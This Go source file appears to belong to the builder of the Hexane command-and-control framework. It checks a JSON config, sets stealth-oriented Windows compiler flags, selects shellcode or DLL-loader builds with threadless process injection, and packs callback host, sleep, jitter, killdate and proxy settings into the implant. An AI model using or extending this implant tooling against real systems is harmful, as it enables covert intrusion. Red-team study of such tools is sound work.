package core

import (
	"fmt"
	"path/filepath"
	"runtime"
)

var ModuleStrings = []string{
	"crypt32",
	"winhttp",
	"advapi32",
	"iphlpapi",
}

func (h *HexaneConfig) GenerateConfigBytes() error {
	var (
		err   error
		patch []byte
	)

	h.Key = CryptCreateKey(16)
	if patch, err = h.CreateBinaryPatch(); err != nil {
		return err
	}

	h.ConfigBytes = patch // Assuming XteaCrypt(patch+18) if needed.

	return nil
}

func (h *HexaneConfig) CreateConfig() {

	WrapMessage("INF", "generating config for "+h.GetBuildType())

	h.Compiler = new(Compiler)
	h.Implant = new(Implant)

	h.Compiler.BuildDirectory = filepath.Join(RootDirectory, "payload/"+h.UserConfig.Builder.OutputName)

	// todo: find a better way to do this that's cross-platform
	h.Compiler.Debug = h.UserConfig.Config.Debug
	h.Compiler.Arch = h.UserConfig.Config.Arch
	h.Compiler.Mingw = "x86_64-w64-mingw32-g++"
	h.Compiler.Objcopy = "x86_64-w64-mingw32-objcopy"
	h.Compiler.Windres = "x86_64-w64-mingw32-windres"
	h.Compiler.Assembler = "nasm"

	if runtime.GOOS == "windows" {
		h.Compiler.Linker = "ld"
		h.Compiler.Strip = "strip"

	} else if runtime.GOOS == "linux" {
		h.Compiler.Linker = "x86_64-w64-mingw32-ld"
		h.Compiler.Strip = "x86_64-w64-mingw32-strip"
	}

	if h.UserConfig.Config.Debug {
		h.Compiler.Flags = []string{
			"",
			"-std=c++23",
			"-g -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel",
			"-fno-ident -fpack-struct=8 -falign-functions=1",
			"-ffunction-sections -fdata-sections -falign-jumps=1 -w",
			"-falign-labels=1 -fPIC",
			"-Wl,--no-seh,--enable-stdcall-fixup,--gc-sections",
		}
	} else {
		h.Compiler.Flags = []string{
			"",
			"-std=c++23",
			"-Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel",
			"-fno-ident -fpack-struct=8 -falign-functions=1",
			"-ffunction-sections -fdata-sections -falign-jumps=1 -w",
			"-falign-labels=1 -fPIC",
			"-Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections",
		}
	}
}

func ReadConfig(cfgPath string) error {
	var (
		err error
		h   *HexaneConfig
	)

	h = new(HexaneConfig)
	jsonPath := filepath.Join(RootDirectory, "json/"+cfgPath)

	WrapMessage("INF", fmt.Sprintf("loading %s", jsonPath))
	if err = h.ReadJson(jsonPath); err != nil {
		return err
	}

	h.CreateConfig()
	h.PeerId = GeneratePeerId()

	if h.UserConfig.Config != nil {
		if h.UserConfig.Config.Hostname == "" {
			return fmt.Errorf("config:: - a hostname must be provided")
		}
		if h.UserConfig.Config.Arch == "" {
			return fmt.Errorf("config:: - an architecture must be provided")
		}
	} else {
		return fmt.Errorf("config:: - Config { } is required")
	}

	if h.UserConfig.Builder != nil {
		if h.UserConfig.Builder.RootDirectory == "" {
			return fmt.Errorf("config:: - a root directory must be provided")
		}
		if h.UserConfig.Builder.OutputName == "" {
			return fmt.Errorf("config:: - an output name must be provided")
		}
		if h.UserConfig.Builder.Sources == nil || len(h.UserConfig.Builder.Sources) == 0 {
			return fmt.Errorf("implant::builder - builder must specify source files")
		}

		if h.UserConfig.Loader == nil {
			h.BuildType = BUILD_TYPE_SHELLCODE

		} else {
			h.BuildType = BUILD_TYPE_DLL

			if h.UserConfig.Loader.RootDirectory == "" {
				return fmt.Errorf("implant::loader - root directory must be specified")
			}
			if h.UserConfig.Loader.Sources == nil {
				return fmt.Errorf("implant::loader - source files must be specified")
			}
			if h.UserConfig.Loader.RsrcScript == "" {
				return fmt.Errorf("implant::loader - resource script must be specified")
			}
			if h.UserConfig.Loader.RsrcBinary == "" {
				return fmt.Errorf("implant::loader - resource output binary must be specified")
			}
			if h.UserConfig.Loader.Injection != nil {
				injectType := h.UserConfig.Loader.Injection.Type

				switch injectType {
				case "threadless":

					var threadlessConfig Threadless
					if err = MapToStruct(h.UserConfig.Loader.Injection.Config, &threadlessConfig); err != nil {
						return fmt.Errorf("implant::injection - threadless configuration - " + err.Error())
					}
				default:
					return fmt.Errorf("implant::loader - unknown injection method - " + injectType)

				}
			} else {
				return fmt.Errorf("implant::injection - Injection { } is required")
			}
		}
	} else {
		return fmt.Errorf("config:: - Builder { } is required")
	}

	if h.UserConfig.Network != nil {
		networkType := h.UserConfig.Network.Type

		switch networkType {
		case "http":

			var httpConfig Http
			if err = MapToStruct(h.UserConfig.Network.Config, &httpConfig); err != nil {
				return fmt.Errorf("implant::network - network configuration - " + err.Error())
			}

			h.Implant.ProfileTypeId = TRANSPORT_HTTP
			WrapMessage("DBG", "loading http config")

			if httpConfig.Address == "" {
				return fmt.Errorf("implant::network::http - ip address must be specified")
			}

			if httpConfig.Port > 65535 || httpConfig.Port < 1 {
				return fmt.Errorf("implant::network::http - invalid tcp port %d", httpConfig.Port)
			}

			if httpConfig.Endpoints == nil {
				// todo: add default endpoints from seclists or smth
				return fmt.Errorf("implant::network::http - at least 1 http endpoint must be specified")
			}

			if httpConfig.Useragent == "" {
				httpConfig.Useragent = Useragent
			}

		case "smb":

			var smbConfig Smb
			if err = MapToStruct(h.UserConfig.Network.Config, &smbConfig); err != nil {
				return fmt.Errorf("implant::network - network configuration - " + err.Error())
			}

			h.Implant.ProfileTypeId = TRANSPORT_PIPE
			WrapMessage("DBG", "loading smb config")

			if smbConfig.EgressPeer == "" {
				return fmt.Errorf("implant::network::smb - peer must have it's parent node name specified")
			}
		default:
			return fmt.Errorf("implant::network - unknown network profile type")

		}
	} else {
		return fmt.Errorf("implant::config - Network { } is required")
	}

	h.UserSession = HexaneSession
	return h.RunBuild()
}

func (h *HexaneConfig) CreateBinaryPatch() ([]byte, error) {
	var err error

	stream := CreateStream()
	implant := h.Implant

	stream.PackByte(1) // LE
	stream.PackByte(1) // Root
	stream.PackBytes(h.Key)

	for _, str := range h.UserConfig.Builder.LoadedModules {
		stream.PackString(str)
	}
	stream.PackDword(h.PeerId)
	stream.PackString(implant.Hostname)
	stream.PackDword(implant.PeerId)
	stream.PackDword(implant.Sleeptime)
	stream.PackDword(implant.Jitter)
	stream.PackInt32(implant.WorkingHours)
	stream.PackDword64(implant.Killdate)

	switch implant.ProfileTypeId {
	case TRANSPORT_HTTP:
		{
			var httpConfig Http
			if err = MapToStruct(h.UserConfig.Network.Config, &httpConfig); err != nil {
				return nil, err
			}

			stream.PackWString(httpConfig.Useragent)
			stream.PackWString(httpConfig.Address)
			stream.PackDword(uint32(httpConfig.Port))
			stream.PackDword(uint32(len(httpConfig.Endpoints)))

			// endpoints always need specified
			// todo: add random endpoints when not specified. use seclists or smth.

			for _, uri := range httpConfig.Endpoints {
				stream.PackWString(uri)
			}

			stream.PackString(httpConfig.Domain)

			if httpConfig.Proxy != nil {
				proxyUrl := fmt.Sprintf("%v://%v:%v", httpConfig.Proxy.Proto, httpConfig.Proxy.Address, httpConfig.Proxy.Port)

				stream.PackDword(1)
				stream.PackWString(proxyUrl)
				stream.PackWString(httpConfig.Proxy.Username)
				stream.PackWString(httpConfig.Proxy.Password)

			} else {
				stream.PackDword(0)
			}

			break
		}
	case TRANSPORT_PIPE:
		{
			var smbConfig Smb
			if err = MapToStruct(h.UserConfig.Network.Config, &smbConfig); err != nil {
				return nil, err
			}

			stream.PackWString(smbConfig.EgressPipename)
		}
	}
	return stream.Buffer, err
}
